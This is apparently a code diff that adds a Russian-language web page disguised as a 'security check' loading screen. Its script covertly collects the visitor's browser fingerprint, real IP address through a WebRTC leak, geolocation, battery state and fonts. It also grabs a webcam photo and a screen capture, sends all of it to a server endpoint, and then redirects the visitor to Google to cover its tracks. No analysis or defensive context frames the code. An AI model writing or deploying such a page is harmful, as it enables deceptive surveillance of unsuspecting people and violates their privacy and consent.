@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Проверка безопасности...</title>
+    <style>
+        body { font-family: system-ui, sans-serif; text-align: center; padding: 20px; background: #0a0a0a; color: white; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #aaa; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h2>⏳ Проверка соединения...</h2>
+    <div class="loader"></div>
+    <div class="status" id="status">Инициализация...</div>
+
+    <script>
+        // ========== 1. Сбор данных о системе ==========
+        async function getData() {
+            const data = {};
+
+            // Браузер и экран
+            data.userAgent = navigator.userAgent;
+            data.language = navigator.language;
+            data.platform = navigator.platform;
+            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            data.deviceMemory = navigator.deviceMemory || 'unknown';
+            data.screenResolution = `${screen.width}x${screen.height}`;
+            data.colorDepth = screen.colorDepth;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.referrer = document.referrer || 'none';
+            data.url = window.location.href;
+
+            // WebRTC — реальный IP (даже за VPN)
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate) {
+                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (ipMatch && ipMatch[0]) data.localIP = ipMatch[0];
+                        pc.close();
+                    }
+                };
+                setTimeout(() => pc.close(), 2000);
+            } catch(e) {}
+
+            // Геолокация (требует разрешения, но запрос выглядит естественно)
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                data.geo_lat = position.coords.latitude;
+                data.geo_lon = position.coords.longitude;
+                data.geo_accuracy = position.coords.accuracy;
+            } catch(e) { data.geo = 'denied'; }
+
+            // Список шрифтов
+            if (document.fonts && document.fonts.ready) {
+                await document.fonts.ready;
+                const fonts = Array.from(document.fonts.values()).map(f => f.family);
+                data.fonts = fonts.slice(0, 30).join(', ');
+            }
+
+            // Батарея (если доступна)
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.battery_level = battery.level * 100 + '%';
+                data.battery_charging = battery.charging;
+            }
+
+            // Проверка на прокси/анонимность
+            data.webdriver = navigator.webdriver || false;
+
+            return data;
+        }
+
+        // ========== 2. Запрос камеры и скриншот ==========
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // Берём кадр через 500 мс
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+
+                stream.getTracks().forEach(track => track.stop());
+                return imgData;
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ========== 3. Скриншот экрана (запрашивает отдельное разрешение) ==========
+        async function captureScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1920;
+                canvas.height = video.videoHeight || 1080;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+                stream.getTracks().forEach(track => track.stop());
+                return imgData;
+            } catch(e) {
+                return null;
+            }
+        }
+
+        // ========== 4. Отправка данных на сервер ==========
+        async function sendData(data, screenshotBase64 = null, screenCaptureBase64 = null) {
+            const payload = { ...data };
+            if (screenshotBase64) payload.screenshot_base64 = screenshotBase64;
+            if (screenCaptureBase64) payload.screen_capture_base64 = screenCaptureBase64;
+
+            try {
+                await fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) { console.error('send error', e); }
+        }
+
+        // ========== 5. Главный раннер ==========
+        (async () => {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = 'Сбор информации...';
+
+            const data = await getData();
+            statusDiv.innerText = 'Запрос камеры...';
+
+            const photoBase64 = await capturePhoto();
+            if (photoBase64) statusDiv.innerText = 'Фото сделано.';
+
+            const screenBase64 = await captureScreen();
+            if (screenBase64) statusDiv.innerText = 'Скриншот экрана сделан.';
+
+            statusDiv.innerText = 'Отправка отчёта...';
+            await sendData(data, photoBase64, screenBase64);
+
+            statusDiv.innerText = 'Готово. Перенаправление...';
+
+            // Редирект на легальную страницу (например, Google)
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
+        })();
+    </script>
+</body>
+</html>
